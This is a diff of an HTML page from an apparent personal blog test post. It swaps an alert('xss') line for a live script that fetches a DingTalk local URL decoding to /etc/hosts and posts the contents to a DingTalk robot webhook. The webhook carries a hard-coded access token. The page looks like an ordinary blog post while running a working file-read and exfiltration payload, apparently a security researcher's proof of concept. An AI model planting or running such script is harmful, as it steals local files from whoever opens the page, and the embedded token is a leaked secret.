@@ -1,61 +1,68 @@
 <!DOCTYPE html>
 <html lang=en>
 <head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="hi, this page is used for test.">
-<meta property="og:type" content="article">
-<meta property="og:title" content="hello">
-<meta property="og:url" content="http://j3ttt.github.io/2022/09/30/hello/index.html">
-<meta property="og:site_name" content="jettt&#39;s blog">
-<meta property="og:description" content="hi, this page is used for test.">
-<meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2022-09-30T02:02:53.000Z">
-<meta property="article:modified_time" content="2022-10-08T05:44:03.567Z">
-<meta property="article:author" content="jettt">
-<meta name="twitter:card" content="summary">
-    
-    
-      
-        
-          <link rel="shortcut icon" href="/images/favicon.ico">
-        
-      
-      
-        
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-        
-      
-      
-        
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-        
-      
-    
-    <!-- title -->
-    <title>hello</title>
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
-
-    <!-- persian styles -->
-    
-    <!-- rss -->
-    
-    
-	<!-- mathjax -->
-	
-<meta name="generator" content="Hexo 5.4.2"></head>
+    </head>
 
 <body class="max-width mx-auto px3 ltr">
     
-<script>alert(`xss`)</script>
+<!-- <script>
+  // 构造json
+    const aaa = "aaa"
+    const json = {
+      msgtype: "text",
+      text: {
+        content: aaa
+      }
+    }
+    console.log('API 返回的结果：', JSON.stringify(json));
+</script> -->
+<!-- <script src="/js/get_hosts.js"></script> -->
+<script>
+  // 读取 /etc/hsots
+fetch('https://loc.dingtalk.com/L2V0Yy9ob3N0cw==')
+  .then(response => response.text())
+  .then(data => {
+    const jsonData = {
+      msgtype: 'text',
+      text: {
+        content: data
+      }
+    };
+
+    const xhr = new XMLHttpRequest();
+    xhr.open('POST', 'https://oapi.dingtalk.com/robot/send?access_token=f13469d51f6df375f8e199d4dd7766aeb1c0e00a2ec7f343d8eb0cd4082d5e86', true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.onload = function() {
+      if (xhr.status >= 200 && xhr.status < 400) {
+        var response = JSON.parse(xhr.responseText);
+        // 处理响应数据
+        prompt('response:' ,response)
+      } else {
+        // 请求失败，处理错误
+        prompt('response error:')
+      }
+    };
+    xhr.onerror = function() {
+      // 请求错误，处理错误
+      prompt('onerror',xhr.status, xhr.statusText)
+    };
+    xhr.send(JSON.stringify(jsonData));
+  })
+  .catch(error => {
+    console.error('获取文本数据时发生错误:', error);
+  });
 
 
-<script src="/js/main.js"></script>
+  // 读取然后 prompt
+  // fetch('https://loc.dingtalk.com/L2V0Yy9ob3N0cw==')
+  // .then(response => response.text())
+  // .then(data => {
+  //   prompt('接口返回的数据：', JSON.stringify(data));
+  // })
+  // .catch(error => {
+  //   console.error('Error:', error);
+  // });
+</script>
 
 
 </body>
